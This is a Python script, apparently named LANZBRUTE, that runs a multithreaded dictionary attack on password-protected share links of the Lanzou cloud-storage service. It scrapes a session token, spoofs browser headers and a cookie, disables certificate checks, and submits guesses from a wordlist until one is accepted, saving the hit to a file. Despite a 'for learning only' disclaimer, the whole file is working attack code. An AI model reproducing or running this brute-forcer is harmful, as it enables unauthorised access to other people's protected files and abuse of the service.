import urllib,threading,ssl,time,random,http.cookiejar
ssl._create_default_https_context=ssl._create_unverified_context
import requests
import json
import math
import sys

sign = ""
posturl="https://wwta.lanzoub.com/ajaxm.php"
headers = {
    "Host": "wwta.lanzoub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/javascript, */*",
    "Sec-Fetch-Dest": "empty",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://wwta.lanzoub.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7",
    "Cookie": "codelen=1; ai_user=FWg/iqzvP3hpX3jVbUYNDB|2023-01-03T11:39:57.357Z; pc_ad1=1",
}

print("LANZBRUTE 2023.02.07")
print("本软件仅供学习交流,请勿用于非法用途")

url=input("Please input Url (https://wwta.lanzoub.com/ikLuO0iwztid):")
# testUrl
if url == "":
    url = "https://wwt.lanzoub.com/iFgeg099lwif"

pwdfile=input("Please enter the password dictionary filename (default:pwdDict.txt) :")
if pwdfile == "":
    pwdfile = "pwdDict.txt"

ignorepwdfile=input("Please enter the log filename:")
if ignorepwdfile == "":
    ignorepwdfile = "log.txt"
threadnum=input("Please enter thread number:")
threadnum=int(threadnum)
print("==============================================================")



ignorelist=set()

try:
    logFd = open(ignorepwdfile, "r")
    for line in logFd:
        ignorelist.add(line.strip())
    logFd.close()
except:
    pass

pwdDict=[]
pwdFd = open(pwdfile, "r")
for line in pwdFd:
    line = line.strip()
    if line not in ignorelist:
        pwdDict.append(line)
pwdFd.close()

length = len(pwdDict)
pwdGroups = []
password = ""
for i in range(threadnum):
    pwdGroups.append(pwdDict[math.floor(i / threadnum * length):math.floor((i + 1) / threadnum * length)])
checkCnt = 0
for i in range(threadnum):
    checkCnt += len(pwdGroups[i])
    print("Thread",i,"password:",len(pwdGroups[i]))
assert(checkCnt==length)

print("Total password:",length)
input("Pleas Enter to continue……")
print("==============================================================")

# Refresh to get new sign
def getSign():
    response = requests.get(url,headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78"},verify=False)
    html = response.content.decode()
    tmp1 = html.find("sign")
    start = html.find("sign",tmp1+1)
    end = html.find("&p=",start)
    return html[start+5:end]

def GetPwd(i):
    cnt = len(pwdGroups[i])
    if cnt == 0:
        return ""
    num=random.randint(0,cnt-1)
    ret=pwdGroups[i][num]
    del pwdGroups[i][num]
    return ret

# record the used passwords
sys.stdout = open(ignorepwdfile,"a")
password = ""

def lanzBrute(tid,_):
    global password
    sign = getSign()
    cookie = http.cookiejar.MozillaCookieJar("cookie.txt")
    handler = urllib.request.HTTPCookieProcessor(cookie)
    opener = urllib.request.build_opener(handler)
    while password=="":
        trying = GetPwd(tid)
        if trying == "":
                break
        data = {
           "p" : trying,
           "action" : "downprocess",
           "sign" : sign,
        }

        # retry for 514 error
        while 1:
            try:
                request = urllib.request.Request(posturl, headers=headers, data=urllib.parse.urlencode(data).encode())
                response = opener.open(request,timeout=5)
                check=response.read().decode()
                break
            except:
                time.sleep(0.5)
        try:
             msg=json.loads(check)
        except:
            print("err",msg)
            break

        if msg['inf']=='已超时，请刷新':
            sign = getSign()
            continue
        elif msg['inf']!='密码不正确':
            print("线程号",tid,msg,trying)
            password = trying
            with open("ans.txt","w") as f:
                f.write(password)
            break
        else:
            print(trying)

            
threadid=[]

for i in range(int(threadnum)):
    threadid.append(threading.Thread(target = lanzBrute, args=(i,i)))
    threadid[i].start()